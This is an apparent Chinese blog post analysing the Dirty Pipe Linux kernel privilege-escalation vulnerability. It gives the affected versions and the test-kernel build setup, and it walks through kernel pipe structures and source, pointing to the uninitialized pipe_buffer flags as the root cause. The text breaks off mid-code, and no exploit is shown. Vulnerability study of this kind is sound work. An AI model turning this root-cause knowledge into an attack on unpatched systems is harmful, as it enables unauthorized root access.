

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Yogdzewa">
  <meta name="keywords" content="">
  
    <meta name="description" content="借着小班报告完成第一个漏洞的学习and复现">
<meta property="og:type" content="article">
<meta property="og:title" content="dirtypipe漏洞分析">
<meta property="og:url" content="https://yogdzewa.github.io/2022-11/CVE-dirtypipe/index.html">
<meta property="og:site_name" content="Yogdzewa">
<meta property="og:description" content="借着小班报告完成第一个漏洞的学习and复现">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yogdzewa.github.io/image/dirtypipe/image-20221109224329290.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/dirtypipe/central-directory-structure.png">
<meta property="og:image" content="https://yogdzewa.github.io/image/dirtypipe/image-20221112212650539.png">
<meta property="article:published_time" content="2022-11-09T02:00:00.000Z">
<meta property="article:modified_time" content="2022-11-13T02:22:33.055Z">
<meta property="article:author" content="Yogdzewa">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yogdzewa.github.io/image/dirtypipe/image-20221109224329290.png">
  
  
  <title>dirtypipe漏洞分析 - Yogdzewa</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/obsidian.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yogdzewa.github.io","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>(￣.￣)</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/image/edit2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="dirtypipe漏洞分析">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-11-09 10:00" pubdate>
        2022年11月9日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      22k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      278 分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">dirtypipe漏洞分析</h1>
            
              <p class="note note-info">
                
                  不可视境界线最后变动于：2022年11月13日 上午
                
              </p>
            
            <div class="markdown-body">
              <p>基本参考 –&gt; <a target="_blank" rel="noopener" href="https://kiprey.github.io/2022/04/dirty-pipe">kp</a> &lt;–</p>
<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>Dirty Pipe 漏洞是 Linux 系统中的一个内核提权漏洞，漏洞危害堪比 Dirty COW，但相对于 Dirty COW 来说更加容易利用。</p>
<p>漏洞影响范围：<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit</a> （v5.8-rc1） ~ <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903">lib/iov_iter: initialize “flags” in new pipe_buffer</a>（v5.17-rc6）</p>
<p>时间范围大概是 2020/5/21 - 2022/2/21。</p>
<h3 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h3><p>在github上直接下载f6dd97版本, 借用了pwn.college的<a target="_blank" rel="noopener" href="https://github.com/pwncollege/pwnkernel">脚本</a>. 然后内核编译设置借鉴kp的<a target="_blank" rel="noopener" href="https://kiprey.github.io/2022/04/dirty-pipe/#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">blog</a>. </p>
<p>编译遇到的额外问题:</p>
<ul>
<li><p>经典的thunk.o, 已经遇到过了. </p>
</li>
<li><p>然后又来个新活, 打了又一个<a target="_blank" rel="noopener" href="https://lore.kernel.org/all/9a9cae7fcf628843aabe5a086b1a3c5bf50f42e8.1585761021.git.jpoimboe@redhat.com/">patch</a>. 真找了半天.  </p>
<img src="../../image/dirtypipe/image-20221109224329290.png" srcset="/img/loading.gif" lazyload alt="image-20221109224329290" style="zoom:80%;" /></li>
<li><p>然后又装了个<a target="_blank" rel="noopener" href="https://src.fedoraproject.org/rpms/dwarves#:~:text=dwarves%20is%20a%20set%20of,recent%20ones%20such%20as%20systemtap.">dwarves</a>, 因为<code>BTF: .tmp_vmlinux.btf: pahole (pahole) is not available</code> </p>
</li>
</ul>
<h3 id="三-代码浅析"><a href="#三-代码浅析" class="headerlink" title="三. 代码浅析"></a>三. 代码浅析</h3><blockquote>
<p>pipe相关函数<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/filesystems/splice.html#c.pipe_buffer">接口</a>(无源码, kernel doc) </p>
</blockquote>
<h4 id="read-amp-write"><a href="#read-amp-write" class="headerlink" title="read&amp;write"></a>read&amp;write</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>    .open             = fifo_open,<br>    .llseek           = no_llseek,<br>    .read_iter        = pipe_read,     <span class="hljs-comment">// read</span><br>    .write_iter       = pipe_write,    <span class="hljs-comment">// write</span><br>    .poll             = pipe_poll,<br>    .unlocked_ioctl   = pipe_ioctl,<br>    .release          = pipe_release,<br>    .fasync           = pipe_fasync,<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>read&amp;write函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_read</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *to)</span></span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">pipe_write</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *from)</span></span><br></code></pre></div></td></tr></table></figure>

<p>只需简单知道：</p>
<ul>
<li><code>iocb</code>：中存放着获取当前 pipe 结构体的指针</li>
<li><code>from/to</code>：从管道读出来的数据将要写入的地方，iov_iter 迭代器类型。</li>
</ul>
<h4 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h4><p><code>pipe_inode_info</code> 结构体存放了 pipe 机制所要用到的字段：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *  @mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *  @rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *  @wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *  @head: The point of buffer production</span><br><span class="hljs-comment"> *  @tail: The point of buffer consumption</span><br><span class="hljs-comment"> *  @max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *  @ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *  @tmp_page: cached released page</span><br><span class="hljs-comment"> *  @readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *  @writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *  @files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *  @r_counter: reader counter</span><br><span class="hljs-comment"> *  @w_counter: writer counter</span><br><span class="hljs-comment"> *  @fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *  @fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *  @bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *  @user: the user who created this pipe</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>    <span class="hljs-keyword">wait_queue_head_t</span> rd_wait, wr_wait;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> tail;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> max_usage;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ring_size;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> readers;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> writers;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> files;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> r_counter;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> w_counter;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>pipe 存放数据使用的是<strong>环形队列</strong>，即在定长大小的数据环（pipe buf ring）上，尽可能的存储数据. </p>
<ul>
<li><code>head</code>：标注队列首部的<strong>索引</strong>，<strong>head 为接下来要写入的位置</strong>。</li>
<li><code>tail</code>：标注队列尾部的索引，<strong>tail 为接下来要读取的位置</strong>。</li>
</ul>
<h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><p>该结构体存放着实际管道中存放的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *  @page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *  @offset: offset of data inside the @page</span><br><span class="hljs-comment"> *  @len: length of data inside the @page</span><br><span class="hljs-comment"> *  @ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *  @flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *  @private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> offset, len;<br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">private</span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>这个结构体存放了包括页引用、页偏移、数据大小等关键信息。这里的 flag 共有这几种：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/pipe_fs_i.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01    <span class="hljs-comment">/* page is on the LRU */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02    <span class="hljs-comment">/* was atomically mapped */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04    <span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08    <span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10    <span class="hljs-comment">/* can merge buffers */</span></span><br></code></pre></div></td></tr></table></figure>

<p>我们可以暂时不用去管这几种 flag 具体的意思。</p>
<h4 id="iov-iter"><a href="#iov-iter" class="headerlink" title="iov_iter"></a>iov_iter</h4><p>结构体 iov_iter 用于<strong>迭代</strong>那种<strong>被分为多个页的数据</strong>，换句话说，该结构体将用于迭代一个个页面。其结构体如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">iter_type</span> &#123;</span><br>    <span class="hljs-comment">/* iter types */</span><br>    ITER_IOVEC = <span class="hljs-number">4</span>,<br>    ITER_KVEC = <span class="hljs-number">8</span>,<br>    ITER_BVEC = <span class="hljs-number">16</span>,<br>    ITER_PIPE = <span class="hljs-number">32</span>,    <span class="hljs-comment">// 表示正在迭代的数据是位于 pipe 中的</span><br>    ITER_DISCARD = <span class="hljs-number">64</span>,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Bit 0 is the read/write bit, set if we&#x27;re writing.</span><br><span class="hljs-comment">     * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span><br><span class="hljs-comment">     * the caller isn&#x27;t expecting to drop a page reference when done.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> type;<br>    <span class="hljs-keyword">size_t</span> iov_offset;<br>    <span class="hljs-keyword">size_t</span> count;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">iov</span>;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvec</span> *<span class="hljs-title">kvec</span>;</span><br>        <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bio_vec</span> *<span class="hljs-title">bvec</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> nr_segs;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> head;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> start_head;<br>        &#125;;<br>    &#125;;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>其中，一些字段的意义如下：</p>
<ul>
<li><p><code>type</code>：表示当前迭代的数据是来自于什么结构，例如：</p>
<ul>
<li>ITER_PIPE 表示当前迭代的数据为某个 pipe 中的页数据</li>
<li>ITER_DISCARD 表示写入当前 iov_iter 的数据全部丢弃。</li>
<li><code>ITER_KVEC</code> do almost the same, but with data in <strong>kernel</strong> space, </li>
<li><code>ITER_BVEC</code> to work with parts of memory mapped pages.</li>
</ul>
<p>后续针对 iov_iter 做内存读写时，会根据这个 type 来执行不同类型的内存读写操作。</p>
</li>
<li><p><code>iov_offset</code>：当前所迭代到 page 的相对偏移，读写将从该 page 的这个相对偏移开始。</p>
</li>
<li><p><code>cout</code>：可读写的数组字节大小</p>
</li>
</ul>
<h4 id="pipe-read相关调用结构"><a href="#pipe-read相关调用结构" class="headerlink" title="pipe_read相关调用结构"></a>pipe_read相关调用结构</h4><pre><code class=" mermaid">flowchart TB
s[&quot;pipe_read(pipe-&gt;iter)&quot;] --&gt; copy_page_to_iter
copy_page_to_iter --&gt;|iter KVEC+BVEC| copy_to_iter
copy_page_to_iter --&gt;|ITER_PIPE| copy_page_to_iter_pipe
copy_page_to_iter --&gt;|other type| copy_page_to_iter_iovec
copy_to_iter --&gt; _copy_to_iter
_copy_to_iter --&gt;|iter is pipe| copy_pipe_to_iter
_copy_to_iter --&gt;|other| iterate_and_advance???
other_callpoint --&gt;|with iov_iter is pipe| copy_to_iter
copy_pipe_to_iter --&gt; push_pipe
copy_pipe_to_iter --&gt; a[&quot;memcpy_to_page(per page)&quot;]

</code></pre>

<ul>
<li><strong>大致流程</strong>: 循环遍历pipe-&gt;bufs数组, 使用<code>copy_page_to_iter</code>将buf中的一整个page复制到iter中, 如果iter是pipe, 则不复制直接引用, 如此循环再顾及到截断等问题就结束读取. </li>
<li><code>copy_pipe_to_iter</code>真是够有迷惑性的, 它是指iter的类型是pipe, 要从addr指向的页面中复制内容到pipe buf中. </li>
<li>由于<code>copy_page_to_iter_pipe</code> pipe buf 是<strong>直接引用其他页</strong>，因此在 page_write 处<strong>必须确保新传来的数据不会写入这样的页面</strong>中，而这种保证就依赖于 MERGE 标志。然而可以看到一个有意思的事情：虽然 recv pipe buf 结构体上的众多字段都被重新赋值，<strong>但有一个字段却被遗漏了</strong>，<strong>那就是 flags 字段</strong>！</li>
<li><code>push_pipe</code>的作用是检查要写入的pipe的空间是否足够. 如果不够则进行扩充. 当 kernel 循环扩充 pipe_buffer 上的页时，这里也<strong>并没有初始化 pipe_buffer 的 flag 标志</strong>！又因为 pipe_buffer 在设计上便是一个环，因此在扩孔 pipe_buffer 时，这里也<strong>将重用先前 pipe_buffer 所设置的 flag</strong>。</li>
<li>一个小问题, 看到<code>void *kaddr = kmap_atomic(page);</code>函数, 查到了highmem这个<a target="_blank" rel="noopener" href="https://dri.freedesktop.org/docs/drm/vm/highmem.html">概念</a>. 不过函数具体实现是和架构相关的.</li>
</ul>
<blockquote>
<p>这里简单总结一下 copy_page_to_iter 函数与 copy_to_iter 函数在<strong>复制数据进 pipe 时</strong> 所实现的差异：</p>
<ul>
<li>前者是在一个完整 page 上，将数据复制给 pipe。因此 pipe buf 只需直接引用该页，并记录下 offset 和 len，即可完成复制操作。</li>
<li>后者不保证源数据在完整 page 上，而是提供了 addr 和 len，因此 pipe buf 需要自己准备存放数据的 page。</li>
</ul>
</blockquote>
<p>copy_page_to_iter_pipe代码:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,</span></span><br><span class="hljs-params"><span class="hljs-function">             struct iov_iter *i)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 获取待写入的 pipe 结构体</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>    <span class="hljs-comment">// 获取待写入的 pipe 结构体的一些信息，例如 head、tail等等 </span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_tail = pipe-&gt;tail;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i_head = i-&gt;head;<br>    <span class="hljs-keyword">size_t</span> off;<br><br>    <span class="hljs-comment">// 这里是在做一些 check</span><br>    <span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>        bytes = i-&gt;count;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!bytes))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!sanity(i))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>    <span class="hljs-comment">// 获取待写入的相对偏移位置</span><br>    off = i-&gt;iov_offset;<br>    <span class="hljs-comment">// 获取待接收数据的 pipe buf</span><br>    buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>    <span class="hljs-keyword">if</span> (off) &#123;<br>        <span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) 